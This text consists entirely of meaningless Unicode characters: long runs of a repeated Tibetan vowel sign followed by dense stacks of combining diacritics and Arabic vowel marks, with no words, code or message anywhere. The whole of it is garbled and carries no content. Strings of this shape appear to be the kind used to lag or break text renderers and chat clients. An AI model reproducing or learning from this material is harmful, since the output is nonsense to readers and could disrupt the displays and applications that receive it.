ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀೈ̸ًٌٌٍَُِّ̨̲̺̗̻͍̼̜̀ͨ̽͘͏ًٌٍٍَُِِّ̢̞̙̼̗̤̲̄̆ͮͫ͘ͅ͏ًٌٍَُِّ̨͈̋͒͒͌͏̷̸ًًٌٍََُُِّّ̹͚͇͇̯ͪ̄ͧͪ̊ͬ͏̴ًًٌٌٌٍٍٍََُُِِِّّ̨̢̲̞͚̭̤͇̣̺̮̋̋̔̃ͦ̃̐͘͟͞͝͞҉̶̶̶ًًًًٌٌٌٍٍٍََََُُُِِِّّّّ̨̡̨̛̛̛̞͍̠̯̻̞̖̠̫̆ͭ̉ͥ̀̃̀̄ͨ͑̑̂̃͗͘͘͢͟͝͡͝͏̵̸̸̸̴̴ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̛̥̹̹̭͙̲̺̞̹̗̻̞̤̗̲͕̾́́̏̋ͦͧ̀̀͊ͭ̀ͥ̿ͨ̔̀̚͢͜͜͠͠͠͝͏̷̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̧̨̨̛̘̱͓͚͎̦̻̦͉̦͙̞̹̖̳̝ͧ̀̆̅̾͒́̒ͧ̍̋͗̏͗́̍̆̍̂́̄̀ͥ̈́̕͘̕͟͜͟͢͠ͅͅ҉̵ًٌَُّ̮̖̫ͩͯ̃͏̵̷̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̡̨̧̱͈͉̖̱͔͕̹͍͔̱̳̩̞̪̱̈̈͗́̈́ͮ̎̍͗ͬͤ͒́ͭ̈́̇̈́̄̅̀̚͢͢͏̵̶̴̸̸̴̴̵̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̡̧̧̡̧̢̧̧̛͉̼̘͔͈͚̭̝̜͎̯̞͕̘̣̰̗̭̹͚̮̗͍͙̼̫̣̻̲͙̩͊̽̀ͭ̀ͪ̀͆̈́ͬ̐̀͑̀̽͂ͦ̀̿͛̌̎̅̓́̑͐̐ͬ́͆̂͐̚̕͢͟͢͜͢͢͢͜͝͝͝͞͞͞͠ͅ҉̷̴̸̸̷̷̶ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̢̡̢̨̨̨̢̨̧̛̘̩̬̤̳̠̤̝̦͔̟̠̥̬̠͈͇̪̼͔̠̹̺̬̘̣͚̭͙̰̑͆͆ͬ̒͌͗̓͐ͯͪ́̿̆̇ͫ͊͌͒̉ͤͬ̊̆̃̾ͤ͂̀̃ͯ̔ͨ̀ͣ́͑̌ͤͨ̎ͧ̔͂͒̀̂́̕̕̕͘͢͜͜͜͢͠͞͞͠͠͞҉̶̷̸̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̛̟̦̗͎̟̪̘̬͈͕̟̟̎́ͤ͐́̒̈́ͪͧ͑ͪ̆ͤͨ͘̚͜͟͜͠͠͠͠͏ًٌَُّ̩̼ͬ̈͐̏͟͏ِ͕҉̴̵ًًًٌٌٌٍٍٍٍَََُُُِِِّّّ̨̧̝͔̯͇̞̘͚̲͍̠ͦ͆ͧ̑́ͯ̆͜͠͞͠҉ًَُّ̨̺̪̄̉͑͏̴̴̷̵̶̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̨̨̧̧̧̡̡̛̛̱̖̰̥̯̯͈̻͉̥͇͕̣̫͉̯̝̜̺͓͍̣̙̘͖̭̬͕̥̥̰̤ͪ́ͫ̓̃̈́̌͆́͋̀ͮ̋̐ͪ̀̏̉̿̅̈̄ͣ͆͐̍̈ͮ͐̀ͦ̈̅́ͭ͌̕͘̚͘͟͜͡͝͞͞͝͏̷̶̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̢̧̛̛̛͎̖̱̝̗̹̰͕̟̪͚͚̪͖̗̲̃͋̇̎̒̀͐ͦͤͥ̊ͤ͒̇̀ͪ̋͑͜͢͟͠͝ͅ҉ًًٌٌٍََُُِّّ̢̢̪͙͎̥̳̦̤͆̒͛͂̈́̆̌ͥ͢͡͝͏̴̴ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̨̛̥̮̬̪̰̤͔̬̜͕̟̣̓ͥ̍͛̀ͬ͛̊͑́̇̕͢͠͞͡͏ٍَّ̇̉͡͏̷̶̷̴̵ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̛̤̖̙͕̩͔̤̠̣̼̜̣͎̬͓̤̖ͭ̋̿̂ͤ͊̀͒͗ͩ̑ͦ̀̇̀ͯ͘̚͜͝͡͞͞҉̶̵ًٌٍٍَُِّ̢͔̟̀̽ͧ̈́͟͟͏̶̷̶̴ًًٌٌٍٍََُُِِّّ̨̞̼͕̙̙͙̟ͬ͌ͥ̃ͭͣ͟͝ͅ҉̴̷ًًًٌٌٍٍَََُُِِّّّ̧̧̧̯̺̻͕͈̪̦̮̀̀̐ͪͧͤͨ͊́̓̕҉̴ٌٍَُِّ̻͎̫ͤ̌ͅ҉ً̗̾͏ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̢̘͇̥̤̫͇̳ͧ̀ͫͫ͌̓ͧ́̒̿ͣ̏́ͩ̽̐̕͢͡͠͠҉̵̷̷̵̵ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̡̨̡̢̧̛͙͚̰͉̲͍̬͖̟̮͍̰̺̟͚̣̭ͬͫ́̈́̀͗ͯ̓̽̋̃ͥ͡͝҉̵ٍِّ̰̠̘ͪ҉̴̶̸̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̡̞͇͎̼̦͚̰̙̹̣͔̣͕̤͈̘͎̇̌̏̇ͬͧ̅̊̀ͪ̍̏̿ͥ̅̌̂͘͜͟͜͢͟͟͢͞͝͞͞͝ͅ҉̷ًٌٍُِّ̭̗̰̞́͒̀̌̾̈͢͏̷̶̷̸̵̴ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̧̢̧̧̢̢̛̛͇͉͈͕͇͕̟͚̟͇̗̗̘͔̜̦͔̖̲̗͎͙͉͕̹̘̥̓̽ͩͬͭͮ́̒̽̓̈́̒́ͣ̅̓̿ͩ͋̽̉͐ͮ̌́̂ͮ͊̀͗̐̀̃́͘̕͘͢͟͢͜͟͞͡͝͞͡ͅ҉̵̶̵̷̶̶̸̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̢̛̛͎̼͔͚̞̲̳̥͓̹̮̮̳̘̜̼̭̠̫̝̜̻͎̫͙̤̣̪̥͍̖̈́́̊̀̌́̈̉͂̏̅͋̓ͦ́̉̈́ͮ̅͊͌ͫ̉͒ͫ̾͋ͭͫͩͧ̓̽̏̐̄ͧͭ͐̚͘͢͜͡͞͞͠͞͝͏̷ٌٍَُِّ̧̧̘̲̫̏̀ͩ҉ًًًٌٌٍٍََُُِِّّ̡̧̧̛̠̦̙̤͖͐̋ͮ͗ͪ̃́͗ͣ͘̕͢͏̸ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̨̛̛̰̝͍̼̱̭̰̲͍̱̙̄͗͐͊̏̆̊̆͐͛̐͋͛ͯ̕͡͝͞͏ًَُّ͙͎̩̃͒͢͡͏̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̨̡̛̛̫̲͚͉͓̲̟̠̜͖̲̘͔̑ͤ̋ͧͦͨ̄̓̋̉͘͜͡҉̵̶̸ًًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̢̛̼̗̪̰̳̮͖̱͇̲͖͚̩̽͆̇̄̍̐͑́͐̒ͨͬ̀̍̂͊̊̓́̕̚͢͟͞͞͏̴̵̴̵̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̨̡̧̨̢̢̛̛̦̲͈̺̘̤̞͓̹͓̜̻̯̘̼͙̟̯̞ͭ̅̍͐̆ͬͤ̀̉̑̆̅̔̎̓ͥ̾̑ͨ̔͘͢͟҉ًٌٍٍََُِِّّ̜͈̗͎̼͓ͨ̓͢͝͏̶ًًًٌٌٌٍٍََُُُِِّّ̢̡̢̱̞̘̦̭͖́̇̀̑̏͐̔́͆ͩ̕̚͜͟͜͝͏ٍِّͦͧ̕͏̸̷̵̶ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّ̨̢̧̧̨̜͍̻͙̞͇̞͖͍̜͉̤̻̗̠̗̖̥͕̮̥́ͮ̎̀͆̍̋̇̔̾̌̾͛̍͘̕̕̕͘͞͞͠͡͝͏ّ̤̿͏̶̷̷ًًًٌٌٌٍٍَََُُُِِِّّ̱̱͉̠̼̰͙ͯ̀ͮͮ̌̀̓̈͊̌͒̌͘͘͘͞͏̵̶̴̷̷̶̸̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّّ̡̛̛͙͙̳̟͈̰̬̻͖̝͎̫̠͚̣̦̤̮̖̻̬̞̦͉͈͖̗͉̹̺͎͈͙̳̘̗͓͕̲̹̅ͯ̄̊ͨ̇ͦ͐͌́̄ͮ̓̐ͯ́̓̃ͨ̆̔ͪͨ̆ͤͯ̐̓ͬ̔͗̓̆̀̽ͭ̕̕͘̕͟͟͢͟͜͟͝͝͠͞͝͞͝͡͞͞ͅ҉̸ٌٍُِّ̡̡̜͖̦͖ͫ̅̓̍͏ًَ̩͡ͅ҉̵ٌٍُِ͓ͨ̂̏ͪ҉̶̶̴̶ًًٌٌٍٍَََُُِِّّّ̡̝͕͚͇͚͚͍͓͆́͐ͥ͒͟͠҉̶̵ًًًٌٌٌٍٍََُُُِِِّّ̡̧̛̟͓͇͓͈͍͔̪̜̹̙ͪ͒̂́ͮ̅͠͡͏ًٌٍَُِّ̰̺͙̪̑͊̊̕͘҉̸̶̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̡̩̺̤̝̼̗̯̙̻̗̟̂̓̄ͫͦ͒́͊ͣ͘͘̚͘͝҉̶̷̸̵ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̧̡̢̛̛̛̛̙̰̥̗̞̱͓͓̠̘̺̺̳̟̗̣̮͉̺̫̖̬̮̖͇̓͒́̀͌̎͂ͧ́͋ͣͤ̇͂͂̄̀́̀ͬ́͐̕͘̚͠͞͠͞͏̴̶̶̴ًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̨̨̳̰̺̥͔̝̜̫̖̬̯̜̖̳ͨͤ͑̏́̃̆̇ͭ̒̓̊̊̾͒̚͘͢͜͢͜͟͟͠͡͏̴̷ًًٌٌٍَُُِِّ͓̳͎͍͈̋ͩ͋̊́̒̃́͏̵ًٌٍٍَُِّ͇̗͆͛ͧ͗ͭ́͏ّ̅͏̶ًًٌٌٍٍَََُُِِّّ̡̨̢̪̣̺̣̟͇͗̈́̐̏̅̾̈́̓ͨͭ͘͏ًًًٌٌٍٍََُُِِّّ̪̹̥̼̯̱͙̗̀̽̂͋̋̄̀̂́̕͢͝҉̵̶̵ًًٌٌٌٍٍََُُُِِّّ͎͚̙̤͍̮͎̫͖͂̃̽͋ͭ̌̄ͬ̕̕͘͜͟͝͝҉̸̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̨̡̧̡̡̥̖͓͓͍̹̞̼̣̘̥̊̔́̎́ͣͭ̒͌͐̎̀̽̕̕̚͜͞͝͏ًٍَُّ̫͖̪̹̔ͬͣ҉̵̸̷̶̶ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِِّّّّّّّّ̧̢̢̨̢̨̢͇͓̲̟͇̝̜͍̘̹̟̳̰͚̦̯̭͖̼̠͙̭̤̺̜̣ͥ̅ͦͮ̂͊̋ͤͩ̐́͛̉̓̾ͧ͂́ͫ̃ͯ͌̄̊͐̈̈́̂̚͘̕͘͘̕͟͝͡͞͏ًًٌٌٍٍََُُِِّّ̗̪̖̥̱͎ͨͣ̆́̿̂́̃͋͒ͮ͜͟͡͞͠͡ͅ͏̸̷̷ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̨̡̛̘̘̬̼͉̣̠͙̪̦̪̩̜͙͔͋̎ͭ͊͂̒̍̾ͤ̓̋́͌͐̏ͭ̚͘͟͠ͅ͏ًًٌٌٍٍٍََُُِِّّ̧̧̛̗̟̜͕̰͙͚̗̯͖͒̄̀͊̒̑̚͘͜͝͝҉َّ҉ًٌُِ̛̟̭̰̀̔͏̷̷ًًٌٍٍََُِّّ̙̘̬̘̘͉ͪ͆ͭ̎ͬ̕͢͝ͅ҉̴ًٌٌٍٍََُُِِّّ̨̣̦͖̝̖̭͇͙̖̒̄ͮ̎̀̂ͦ̕͝͏ًٌٍُِّ̦͍̠̪ͭ̋̌̚ͅ͏̶ًًٌٍََُُِّ͈̟̖̒͐̑̆̕͡͠͏ًٌٌٍَُِِّ̧̮̩̻̪̤͆̏̿̒̀ͦ͝͠͞͡ͅ҉̴̵̶̶ًًًٌٌٍٍٍَََُُُِِّّّ̯̩͚͔̰̦̣̻͔̭̔̉̄͋ͦͮͥ̒̇́͜͟͡͝ͅ҉̵ًًًٌٌٌٌٍٍٍٍَََُُُِِِِّّّّ̡̢̡̡̛͕̙̮̺̥̭͙̖̗̗̳̱̪ͧͩ̓͒͆͛ͭͤͯ̎̉ͣ̃ͫ̎͑̑͘̕͟͢͡͝͡͞ͅ҉̵ًًٌٌٍٍََُُِِّ̨͔͍̘͍̜̺͚ͤ̆͗̌́ͣ͘͞͞͡͏َّ̨̳̌҉̶̸̶ًًًًٌٌٌٍٍٍَََُُُُِِِّّّ̧̧̧̢̱̠͉̦̭̬̞̮͈̞ͥ́̄ͦ̀ͤ̅̋̓ͬ̕̚͟͞҉̷ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̨̢̡̡̢̧̢̨̛̛̻͙̩̹̞̲̠͙̗̳̥̝̼̗̟̩̮̱̖̱̞͎̳͚̻̯̲͖̦̟̫̥͙̃̔ͧͪ͂̀ͫ̋ͣ͒͐̿̎̉ͬ̓̂̑ͨͤ̌ͫͣ̆̚̕͟͜͢͝͞͞͝͞҉̴ًًٌٌٍٍََُُِِِّّ̛̛̺̹̙̩͚̭̟̀ͯ͋̀̅͂ͭͪ̐͜͢͞͠͏ًٌٍٍَُِّ̧̨̺̪̠̜ͧ͢͡҉َّ͚̳̏҉̶̴̶̸̷̸̶̷̵̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̨̡̢͇͉̼̻̥̰͚̮̖̲͈̪̖̺̱̞̳̺͔͉̤͇̻ͤ͗͛͑̀́̄ͭ̽̿͗̓̋͋̾̈́̒ͤͨͥ̊̓́́̒͑̓͛̔̈̓͊̎ͪ͛̂͑͑ͬ̒̚̚̕͟͜͜͟͜͜͝͝͞͝͝͝͝҉̸ًًًٌٌٌٍٍَََُُُِِّّ̡̨̖̞̜̻̖̞̀̌͐̑͗ͨ̄̌̀̃̍̈́́̇ͬ͟͞ͅ͏̴ًًٌٌٍٍٍََُُِِِّّّ̢̧̛̼̗̰͓͙̼̏ͮ́̒̔̋ͭ̈́ͨ͆͢͞͠͞ͅ҉̴̶̴̶̷ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّ̨̧̡̛͚͖̼̯̼̘̖̪̞͔̮͈͎̻͈̘͖͉̳͔̙̍̀͐͒ͫ̐̍̐͊̎͛̒̐̓ͤͦͭͯ̑ͬ͐͐̇̀̒̓̑͗̕̕͜͜͢͜͠͠͞͠͝ͅ͏̵̵̶̴̶̵̶ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُُِِِِِِِّّّّّّّ̡̨̢̧̛̛̙̻̖͉̗̣̣͖͇͉̳̰̘̜͉̰̠̳̣̮̲͖̭̯̮̅͋ͦ̽ͪ͗͒͂̀͗̉̋̆ͨ͒̎̎͛̄͑̚̕̕̕͟͜͝͡ͅ͏ًٌَُ̰̳̫̪́ͬ͒͊͘҉ِ̗͏̴̷̷̶̶̷̷̴̷̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّّ̢̡̧̡̡̛̛̣̥̯͓̜̰̜̻͚͇̳̣̭̥͖̦̭̫͎̣͇͔̘͖̫͍̹̘̺͖͈̘͍͈͓͙͎̺͔̥̊̀̒͋͊̉̽͆ͫ̎̏͑̿̓ͤͤͦ́ͬ̂͗ͮ͆̉̋̓̉ͩ͘͘͟͢͢͜͟͟͟͞͠͠͠͡ͅ҉ٌٍَُِّ̛̖̣̊̌̇͂ͣ͘͏̴ًٌٍُِ̪̭́͐̈͡͠͏ًًٌٍََُُِّّ̫͚̬̘͓̲ͦ͌̓́͛͜͝͡҉̶̷ًٌٌٍٍَُِِّ̡̡̬̗͈̮̹ͯ̉̄̾̽̍͊̕͘͝͏ّ̯̊͏̷̸̸̵̶̵ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̨̡̨̢̡̛͕̮̥̦̘͓͍̲̞̮̟̭͓͕̫͍̞̻̱̼͉̫̮̝̙͖̞̣̺͍̥͖̯͛̆́͛ͭ̓ͬ́ͦ̃͑ͩͪ͛̑͗̓ͥ͛̆̽ͥͩ̄͌ͬ̒̂̍̋͘̕͘͜͞͝͠͝҉ًًٌٌٌٍٍََُُِِّّ̢̨̨̛̭̳̩̮͉̲ͯ̎̀̿͘͡ͅ͏̴̵̶ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̨̢̢̳̝̬̺̭͓̺̝͈̖̜̖̜͎̞̥͓̰ͣ͗ͨ́̇̓̀̃ͣ̀̒͒͋̀̈́̕̚͝͝҉̴̴̷̴̷ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̨̧̢̯͇͖̤̻̟͎͖̩̻̬̱̲̟̞̘̥̥͍̠̰͍̔̌͌̌̈́͛̔ͩ́͆̇͋͆̏̓͗̚͜͟͞͠҉̸̵ًًٌٌٍٍََُُِِّ̤̣͉̼͚̭̪̜̲̮ͨ̎ͨ̀̊̒͊̍̕̚͝͏̵ًًًٌٌٌٍٍٍََََُُُِِِّّّّ̢̢̡͎̪̲̪̥̱͖͔̩͕ͦͤ̀̾̃̑̏͐̄͒ͤ͂̏͘̕͘͢͠͠͡҉ًُ̝̔́͏̷̴ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̨̡̡̗̪͖̬̘͎̮̥̺̤̜͖̺̣̗͖̇̽ͧͧͫ̔̑ͬ͋̀ͧ̄͊̈̊̕͡͠͝͏ًٌٍُِ̪̝͎͕ͤ̽̋̈̕̕҉̸ًًٌٍََُِّّ̧̛̬̭̖̪̳͚ͬ͒ͭ͡͏ًًٌٌٍٍََُُُِِّّ̧̛̛͈͈͕̳̫̹͍̭̼̦̂̑͗̈́ͣ͒͛̊͜͞͠҉̸̷̵̶̸̵ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِِّّّّّّّ̧̧̛̛̻̻̺̣͓̝̫͉̞̱̟̯̜̲͔͇͍͓̼̫̗ͩ͐ͥ͊ͬͣͭ̓̀ͧ̈́̀̓̂̓̄̌ͩ̂͒ͧ͗̈́͛͛̅͊͟͟͢͢͢͟͟͝͞͠͠҉ٌٍُِّ̢͇̺̠̗̄͏ًَ͇̜̏͠҉̴ٌٍُِّ̗͉̘͊͟͏̷̴̶̵̸ًًًٌٌٌٍٍٍَََُُُِِِّّ̡̡̢̢̻͎̟͕̮̫͉̰̙͎̝ͮ́̆ͪ̒̉̀̚̚͢͞͠҉̴̵̸̷̸̴̴̷̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̨̡̧̨̤̯̬͙̟̜̻͉̩͙̫͎͎̱͎̣̝̤͈͍̳̩͓̯̭̗͕̂̎̈̅̇͑ͦ͂̐̄͆͛̊ͣͯ̉̊́͑ͯ̏ͧ͗̑̋ͩ̍ͩ̆̈̚̚̕͢͢͟͢͢͠͞҉̵̵̶ًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̡̡̨̨̢̗͍͈̗̜̱͖̤͔̭̹͍̫͔͖̰̠̜̦̥͗̉̎́͛ͭ̀ͫ́̊́̒ͥͦͪͤͬ̑̕͘̕̕͜͢͞͞͞͡͡͠҉ً͓́҉̸ًٌٌٍٍَُُِِّّ̛̞͙̤͉͙͕̓̉͂̽̿̿̽͝